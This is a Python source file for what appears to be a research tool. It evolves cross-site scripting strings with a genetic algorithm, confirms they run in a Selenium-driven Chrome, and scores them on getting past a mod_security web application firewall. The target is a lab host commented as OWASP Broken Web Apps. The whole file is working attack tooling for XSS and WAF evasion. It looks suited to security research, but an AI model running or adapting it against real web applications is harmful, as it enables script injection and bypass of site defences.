# -*- coding: utf-8 -*-
import os
import random
import re
import subprocess
import time
import locale
import ConfigParser
import pandas as pd
import GeneticAlgorithm as ga
from decimal import Decimal
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from requests import Request, Session

# genetic algorithm
GENOM_LENGTH = 5
MAX_GENOM_LIST = 100
SELECT_GENOM = 20
INDIVIDUAL_MUTATION = 0.3
GENOM_MUTATION = 0.7
MAX_GENERATION = 10000
MAX_FITNESS = 3
WAIT_TIME = 0.0

# selenium
SIZE_WIDTH = 780
SIZE_HEIGHT = 480
POS_WIDTH = 520
POS_HEIGHT = 1

# target apps (OWASP Broken Web Apps)
TARGET = 'http://192.168.184.129/'


def create_genom(int_length, df_gene):
    lst_gene = []
    for _ in range(int_length):
        lst_gene.append(random.randint(0, len(df_gene.index)-1))
    return ga.Gene(lst_gene, 0)


def evaluation(obj_ga, df_gene, lst_browser, idx):
    # build html syntax.
    str_html = ''
    lst_gene = []
    for gene_num in obj_ga.genom_list:
        str_html += str(df_gene.loc[gene_num].values[0])
        lst_gene.append(gene_num)
    str_html = str_html.replace('%s', ' ').replace('&quot;', '"').replace('%comma', ',')
    str_file_name = 'test' + str(idx) + '.html'
    obj_fout = open('C:\\Users\\itaka\\PycharmProjects\\GAN_test\\tmp\\' + str_file_name, 'w')
    obj_fout.write(str_html)
    obj_fout.close()

    # evaluate html syntax using tidy.
    str_cmd = 'tidy-5.4.0-win64\\tidy -f result.txt tmp\\' + str_file_name
    enc = locale.getpreferredencoding()
    env_tmp = os.environ.copy()
    env_tmp['PYTHONIOENCODING'] = enc
    subprocess.Popen(str_cmd,
                     stdout=subprocess.PIPE,
                     stderr=subprocess.PIPE,
                     env=env_tmp)
    str_eval_result = open('result.txt', 'r').read()
    str_pattern = r'.*Tidy found (.*) warnings'
    obj_match = re.match(str_pattern, str_eval_result.replace('\t', '').replace('\r', '').replace('\n', ''))
    warnings = 0
    if obj_match:
        warnings = obj_match.group(1)
    str_pattern = r'.*warnings and (.*) error!'
    obj_match = re.match(str_pattern, str_eval_result.replace('\t', '').replace('\r', '').replace('\n', ''))
    errors = 0
    if obj_match:
        errors = obj_match.group(1)
    # compute score.
    int_score = int(warnings) * -0.1 + int(errors) * -1

    # evaluate running script using selenium.
    eval_status = 0
    waf_status = ''
    for obj_browser in lst_browser:
        try:
            obj_browser.get('file://C:\\Users\\itaka\\PycharmProjects\\GAN_test\\tmp\\' + str_file_name)
        except Exception as e:
            obj_browser.switch_to.alert.accept()
            eval_status = 1
            return int_score, eval_status

        try:
            # judge JavaScript (include event handler).
            obj_browser.refresh()
            ActionChains(obj_browser).move_by_offset(10, 10).perform()
            obj_browser.refresh()
        except Exception as e:
            try:
                obj_browser.switch_to.alert.accept()
                # compute score for running script.
                int_score += 1

                # attempt breaking WAF (mod_security).
                obj_session = Session()
                payload = {'test': str_html}
                obj_request = Request('GET', TARGET, params=payload)
                obj_prepped = obj_session.prepare_request(obj_request)
                obj_response = None
                obj_response = obj_session.send(obj_prepped,
                                                verify=True,
                                                proxies={'http': '127.0.0.1:8083'})
                # compute score for breaking WAF.
                if obj_response.status_code == 200:
                    waf_status = 'break'
                    int_score += 2
                else:
                    waf_status = 'block'
                    int_score -= 0.5
            except Exception as e:
                eval_status = 1
                return int_score, eval_status

            # output evaluation results.
            print('{0} {1} : {2} : {3} : {4}'.format(obj_browser.name,
                                                     obj_browser.capabilities['version'],
                                                     waf_status,
                                                     str_html,
                                                     lst_gene))
    return int_score, eval_status


def select(obj_ga, elite):
    # sort in desc order of evaluation.
    sort_result = sorted(obj_ga, reverse=True, key=lambda u: u.evaluation)
    # extract elite individuals.
    result = [sort_result.pop(0) for _ in range(elite)]
    return result


def crossover(ga_first, ga_second):
    genom_list = []
    # setting of two-point crossover.
    cross_first = random.randint(0, GENOM_LENGTH)
    cross_second = random.randint(cross_first, GENOM_LENGTH)
    one = ga_first.getGenom()
    second = ga_second.getGenom()

    # crossover.
    progeny_one = one[:cross_first] + second[cross_first:cross_second] + one[cross_second:]
    progeny_second = second[:cross_first] + one[cross_first:cross_second] + second[cross_second:]
    genom_list.append(ga.Gene(progeny_one, 0))
    genom_list.append(ga.Gene(progeny_second, 0))
    return genom_list


def next_generation_gene_create(ga, ga_elite, ga_progeny):
    # sort in asc order of evaluation.
    next_generation_geno = sorted(ga, reverse=False, key=lambda u: u.evaluation)
    # remove sum of adding the elite group and offspring group.
    for _ in range(0, len(ga_elite) + len(ga_progeny)):
        next_generation_geno.pop(0)
    # add the elite group and offspring group to the next generation.
    next_generation_geno.extend(ga_elite)
    next_generation_geno.extend(ga_progeny)
    return next_generation_geno


def mutation(obj_ga, induvidual_mutation, genom_mutation, df_genes):
    lst_ga = []
    for idx in obj_ga:
        # mutation to individuals.
        if induvidual_mutation > (random.randint(0, 100) / Decimal(100)):
            lst_gene = []
            for idx2 in idx.getGenom():
                # mutations to genes.
                if genom_mutation > (random.randint(0, 100) / Decimal(100)):
                    lst_gene.append(random.randint(0, len(df_genes.index)-1))
                else:
                    lst_gene.append(idx2)
            idx.setGenom(lst_gene)
            lst_ga.append(idx)
        else:
            lst_ga.append(idx)
    return lst_ga


if __name__ == '__main__':
    # load config.
    inifile = ConfigParser.SafeConfigParser()
    try:
        inifile.read('config.ini')
    except:
        print('error: can\'t read config.ini.')
        exit(1)
    genes = inifile.get('Genetic', 'gene_list')

    # load gene list.
    df_genes = pd.read_csv(genes, encoding='utf-8').fillna('')

    # initialize selenium using Chrome, IE.
    obj_chrome = webdriver.Chrome(executable_path=r'web_drivers\\chromedriver.exe')
    obj_chrome.set_window_size(SIZE_WIDTH, SIZE_HEIGHT)
    obj_chrome.set_window_position(POS_WIDTH, POS_HEIGHT)
    print('Launched : {0} {1}'.format(obj_chrome.name, obj_chrome.capabilities['version']))
    # obj_ie = webdriver.Ie(executable_path=r'web_drivers\\IEDriverServer.exe')
    # obj_ie.set_window_size(SIZE_WIDTH, SIZE_HEIGHT)
    # obj_ie.set_window_position(POS_WIDTH-10, POS_HEIGHT+10)
    # print('Launched : {0} {1}'.format(obj_ie.name, obj_ie.capabilities['version']))

    # generate 1st generation.
    lst_current_generation = []
    for _ in range(MAX_GENOM_LIST):
        lst_current_generation.append(create_genom(GENOM_LENGTH, df_genes))

    # evaluate individual.
    lst_browser = []
    lst_browser.append(obj_chrome)
    # lst_browser.append(obj_ie)
    idx = 0
    for int_count in range(1, MAX_GENERATION + 1):
        for i in range(MAX_GENOM_LIST):
            evaluation_result, eval_status = evaluation(lst_current_generation[i],
                                                        df_genes,
                                                        lst_browser,
                                                        idx)
            idx += 1
            if eval_status == 1:
                i -= 1
                continue
            lst_current_generation[i].setEvaluation(evaluation_result)
            time.sleep(WAIT_TIME)

        # select elite's individual.
        elite_genes = select(lst_current_generation, SELECT_GENOM)

        # crossover of elite gene.
        progeny_gene = []
        for i in range(0, SELECT_GENOM):
            progeny_gene.extend(crossover(elite_genes[i - 1], elite_genes[i]))

        # select elite group.
        next_generation_individual_group = next_generation_gene_create(lst_current_generation,
                                                                       elite_genes,
                                                                       progeny_gene)

        # mutation
        next_generation_individual_group = mutation(next_generation_individual_group,
                                                    INDIVIDUAL_MUTATION,
                                                    GENOM_MUTATION,
                                                    df_genes)

        # finish evolution computing for current generation.
        # arrange fitness each individual.
        fits = [_.getEvaluation() for _ in lst_current_generation]

        # evaluate evolution result.
        flt_min = min(fits)
        flt_max = max(fits)
        flt_avg = sum(fits) / float(len(fits))
        print('-----{0} generation result-----'.format(int_count))
        print('  Min:{0}'.format(flt_min))
        print('  Max:{0}'.format(flt_max))
        print('  Avg:{0}'.format(flt_avg))

        # judge fitness.
        if flt_avg > MAX_FITNESS:
            print('Finish evolution. Average is {}'.format(str(flt_avg)))
            break

        # replace current generation and next generation.
        current_generation_individual_group = next_generation_individual_group

    # close browser.
    for obj_browser in lst_browser:
        obj_browser.close()

    # output final result.
    str_best_individual = ''
    for gene_num in elite_genes[0].getGenom():
        str_best_individual += str(df_genes.loc[gene_num].values[0])
    str_best_individual = str_best_individual.replace('%s', ' ').replace('&quot;', '"').replace('%comma', ',')
    print('Best individual is [{0}]'.format(str_best_individual))
